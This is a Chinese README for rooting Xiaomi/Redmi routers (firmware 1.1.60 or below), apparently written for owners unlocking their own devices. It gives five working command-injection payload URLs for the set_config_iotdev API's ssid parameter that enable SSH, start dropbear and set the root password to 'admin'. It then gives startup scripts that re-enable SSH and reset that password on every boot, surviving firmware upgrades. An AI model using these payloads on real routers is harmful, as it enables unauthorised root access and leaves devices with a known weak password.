## 用法
1. 确保路由器版本为 1.1.60 或以下。
2. 登录获取`TOKEN`.
3. 编辑`payload url`并执行.
4. SSH已启用. 登录用户名为 `root` 密码为 `admin`.

## Payload Url
```
http://192.168.31.1/cgi-bin/luci/;stok=TOKEN/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=-h%0anvram%20set%20ssh_en=1%0anvram%20commit%0a

http://192.168.31.1/cgi-bin/luci/;stok=TOKEN/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=-h%0aecho%20sed%20-i%20's/channel=.*/channel="debug"/g'%20/etc/init.d/dropbear%20>%20/tmp/r.sh%0ash%20/tmp/r.sh%0arm%20/tmp/r.sh%0a

http://192.168.31.1/cgi-bin/luci/;stok=TOKEN/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=-h%0a/etc/init.d/dropbear%20start%0a

http://192.168.31.1/cgi-bin/luci/;stok=TOKEN/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=-h%0a/etc/init.d/dropbear%20enable%0a

http://192.168.31.1/cgi-bin/luci/;stok=TOKEN/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=-h%0aecho%20echo%20-e%20"admin\nadmin"%20|%20passwd%20root%20>%20/tmp/pass.sh%0ash%20/tmp/pass.sh%0arm%20/tmp/pass.sh%0a
```

## 固化SSH
1. 在 /etc/firewall.user 文件中，添加一句 source /etc/basic_settings/basefile.sh
```
echo -e "\nsource /etc/basic_settings/basefile.sh" >> /etc/firewall.user
```
2. 创建 basic_settings 文件夹、basefile.sh 文件、my_script.sh 文件
```
mkdir /etc/basic_settings
touch /etc/basic_settings/basefile.sh
touch /etc/basic_settings/my_script.sh
chmod 755 /etc/basic_settings/basefile.sh
chmod 755 /etc/basic_settings/my_script.sh
```
3. 编辑 /etc/basic_settings/basefile.sh 填写以下内容
```
#!/bin/sh
echo "source /etc/basic_settings/my_script.sh; exit 0" > /etc/rc.local
```
4. 编辑 /etc/basic_settings/my_script.sh 填写以下内容
```
#!/bin/sh

#check ssh 
ver_flag="$(uci -c /usr/share/xiaoqiang get xiaoqiang_version.version.CHANNEL)"
if [ "$(nvram get ssh_en)" != "1" -o "$ver_flag" == "release" ]; then
    echo "$(date) : 本次开机ssh_en被关闭或者版本标记被重置，您可能进行了固件升级。" >> /tmp/my_log.txt 
    nvram set ssh_en=1
    nvram commit
    uci -c /usr/share/xiaoqiang set xiaoqiang_version.version.CHANNEL='stable'
    uci -c /usr/share/xiaoqiang commit xiaoqiang_version.version
    echo "$(date) :已重新开启ssh_en，并设置版本标记为stable。" >> /tmp/my_log.txt 
    /etc/init.d/dropbear enabled
    if [ $? == "1" ]; then
        echo "$(date) :dropbear开机自启动被关闭，现重新开启。" >> /tmp/my_log.txt 
        /etc/init.d/dropbear enable
    fi
    /etc/init.d/dropbear restart
    echo -e "admin\nadmin" | passwd root
    echo "$(date) :已将root密码重置为 admin" >> /tmp/my_log.txt 
fi
```
注：版本标记设置为 stable，路由器就会认为是 开发版。release -> 稳定版、current -> 内测版。

## 参考链接
* [解锁京东云 Redmi AX5 ssh](https://m1ku.in/archives/783)
* [关于小米路由器升级系统保留SSH的简单方法](https://icode.best/i/10101345505777)
